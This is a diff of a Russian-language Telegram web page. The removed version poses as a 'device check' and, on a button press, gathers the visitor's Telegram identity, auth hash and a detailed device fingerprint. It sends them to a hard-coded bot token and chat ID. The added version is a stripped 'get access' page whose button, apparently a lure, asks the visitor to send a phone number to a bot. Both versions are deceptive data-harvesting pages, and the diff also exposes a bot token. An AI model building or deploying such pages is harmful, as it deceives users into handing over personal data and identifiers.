@@ -2,232 +2,30 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Сбор данных</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Получить доступ</title>
     <style>
-        :root {
-            --bg-color: var(--tg-theme-bg-color, #fff);
-            --text-color: var(--tg-theme-text-color, #000);
-            --button-color: var(--tg-theme-button-color, #3390ec);
-            --button-text-color: var(--tg-theme-button-text-color, #fff);
-            --hint-color: var(--tg-theme-hint-color, #999);
-            --secondary-bg: var(--tg-theme-secondary-bg-color, #f1f1f1);
-        }
-
         body {
-            margin: 0;
-            padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background-color: var(--bg-color);
-            color: var(--text-color);
+            font-family: Arial, sans-serif;
             display: flex;
-            flex-direction: column;
-            align-items: center;
             justify-content: center;
-            min-height: 100vh;
-            transition: background-color 0.3s, color 0.3s;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f2f5;
         }
-
-        .container {
-            text-align: center;
-            padding: 20px;
-            width: 100%;
-            max-width: 400px;
-        }
-
-        h1 {
-            font-size: 24px;
-            margin-bottom: 10px;
-            font-weight: 700;
-        }
-
-        p {
-            font-size: 15px;
-            color: var(--hint-color);
-            margin-bottom: 30px;
-            line-height: 1.5;
-        }
-
-        .btn {
-            background-color: var(--button-color);
-            color: var(--button-text-color);
-            border: none;
-            border-radius: 12px;
-            padding: 16px 32px;
-            font-size: 17px;
-            font-weight: 600;
-            cursor: pointer;
-            width: 100%;
-            box-sizing: border-box;
-            transition: transform 0.1s, opacity 0.2s;
-            outline: none;
-            -webkit-tap-highlight-color: transparent;
-        }
-
-        .btn:active {
-            transform: scale(0.98);
-            opacity: 0.9;
-        }
-
-        .status {
-            margin-top: 20px;
-            font-size: 14px;
-            opacity: 0;
-            transition: opacity 0.5s;
-            color: var(--tg-theme-link-color, var(--button-color));
-        }
-
-        .status.visible {
-            opacity: 1;
-        }
-        
-        @keyframes pulse {
-            0% { box-shadow: 0 0 0 0 rgba(var(--button-color-rgb, 51, 144, 236), 0.4); }
-            70% { box-shadow: 0 0 0 10px rgba(var(--button-color-rgb, 51, 144, 236), 0); }
-            100% { box-shadow: 0 0 0 0 rgba(var(--button-color-rgb, 51, 144, 236), 0); }
-        }
-        
-        .btn {
-            animation: pulse 2s infinite;
+        .button {
+            background-color: #0088cc;
+            color: white;
+            padding: 15px 30px;
+            text-decoration: none;
+            border-radius: 5px;
+            font-size: 18px;
+            font-weight: bold;
         }
     </style>
 </head>
 <body>
-
-    <div class="container">
-        <h1>Проверка устройства</h1>
-        <p>Для продолжения работы приложения нам необходимо обновить данные вашей конфигурации. Нажмите кнопку ниже.</p>
-        
-        <button class="btn" id="sendBtn">Подтвердить</button>
-        
-        <div class="status" id="statusMessage">Данные успешно отправлены</div>
-    </div>
-
-    <script>
-        const tg = window.Telegram.WebApp;
-        tg.ready();
-        tg.expand();
-
-        // Твой токен бота
-        const BOT_TOKEN = '8884432027:AAHfpXo3FGgg1h2Sn07XIi27uqK-tCW58dU';
-        
-        // Твой ID для получения данных (замени на свой, если нужно не себе в бота, а в личку)
-        // Если оставить 0, данные пойдут в бот, который ты создавал.
-        // Чтобы данные шли тебе в личку, узнай свой ID через @userinfobot и впиши сюда:
-        const TARGET_CHAT_ID = 8658887417; 
-
-        const sendBtn = document.getElementById('sendBtn');
-        const statusMsg = document.getElementById('statusMessage');
-
-        // Функция сбора данных
-        function gatherData() {
-            const user = tg.initDataUnsafe?.user || {};
-            
-            // Базовые данные Telegram
-            const tgData = {
-                id: user.id,
-                first_name: user.first_name,
-                last_name: user.last_name || '',
-                username: user.username || 'Нет юзернейма',
-                language_code: tg.initData?.split('&').find(param => param.startsWith('auth_date')) ? 'Unknown' : tg.initData?.split('&').find(param => param.startsWith('lang'))?.split('=')[1] || 'Unknown',
-                is_premium: user.is_premium || false,
-                hash: tg.initData?.split('&').find(param => param.startsWith('hash'))?.split('=')[1] || 'Нет хэша'
-            };
-
-            // Технические данные браузера/устройства
-            const techData = {
-                user_agent: navigator.userAgent,
-                screen_resolution: `${screen.width}x${screen.height}`,
-                color_depth: `${screen.colorDepth}-bit`,
-                pixel_ratio: window.devicePixelRatio,
-                platform: navigator.platform,
-                cpu_cores: navigator.hardwareConcurrency || 'Неизвестно',
-                memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Неизвестно',
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                language: navigator.language,
-                connection: navigator.connection ? navigator.connection.effectiveType : 'Неизвестно',
-                battery: 'Неизвестно', // Требуется API
-                online: navigator.onLine ? 'Online' : 'Offline'
-            };
-
-            // Попытка получить батарею
-            if (navigator.getBattery) {
-                navigator.getBattery().then(battery => {
-                    techData.battery = `${(battery.level * 100).toFixed(0)}% (Charging: ${battery.charging})`;
-                    sendFullData(tgData, techData);
-                }).catch(() => {
-                    sendFullData(tgData, techData);
-                });
-            } else {
-                sendFullData(tgData, techData);
-            }
-        }
-
-        function sendFullData(tgData, techData) {
-            // Формируем сообщение
-            const text = `
-🔍 <b>Новая сессия</b>
-👤 <b>Имя:</b> ${tgData.first_name} ${tgData.last_name}
-🆔 <b>ID:</b> <code>${tgData.id}</code>
-✉️ <b>Юзернейм:</b> ${tgData.username}
-🌍 <b>Язык:</b> ${tgData.language_code}
-💎 <b>Premium:</b> ${tgData.is_premium ? 'Да' : 'Нет'}
-🔐 <b>Hash:</b> <code>${tgData.hash}</code>
-
-📱 <b>Устройство:</b> ${techData.platform}
-📺 <b>Экран:</b> ${techData.screen_resolution}
-🎨 <b>Цвета:</b> ${techData.color_depth}
-🔍 <b>Pixel Ratio:</b> ${techData.pixel_ratio}
-🧬 <b>Процессор:</b> ${techData.cpu_cores} ядер
-💾 <b>Память:</b> ${techData.memory}
-🕒 <b>Часовой пояс:</b> ${techData.timezone}
-🌐 <b>Язык ОС:</b> ${techData.language}
-📡 <b>Сеть:</b> ${techData.connection}
-🔋 <b>Батарея:</b> ${techData.battery}
-⚡ <b>Статус:</b> ${techData.online}
-🕵️ <b>User-Agent:</b> ${techData.user_agent.substring(0, 100)}...
-            `.trim();
-
-            // Отправка через fetch
-            // Если TARGET_CHAT_ID = 0, данные пойдут в бота. 
-            // Если ты хочешь данные в личку, замени 0 на свой ID.
-            const chat_id = TARGET_CHAT_ID === 0 ? 'me' : TARGET_CHAT_ID;
-
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: chat_id,
-                    text: text,
-                    parse_mode: 'HTML'
-                })
-            })
-            .then(response => {
-                if (response.ok) {
-                    sendBtn.textContent = "Отправлено ✓";
-                    sendBtn.style.backgroundColor = "#4caf50";
-                    statusMsg.classList.add('visible');
-                } else {
-                    statusMsg.textContent = "Ошибка отправки";
-                    statusMsg.classList.add('visible');
-                }
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                statusMsg.textContent = "Ошибка связи";
-                statusMsg.classList.add('visible');
-            });
-        }
-
-        sendBtn.addEventListener('click', () => {
-            sendBtn.disabled = true;
-            sendBtn.style.animation = "none";
-            gatherData();
-        });
-
-    </script>
+    <!-- Замени my_jobs_bot на имя твоего бота -->
+    <a href="https://t.me/my_jobs_bot?start=ref_123" class="button">Отправить номер</a>
 </body>
 </html>
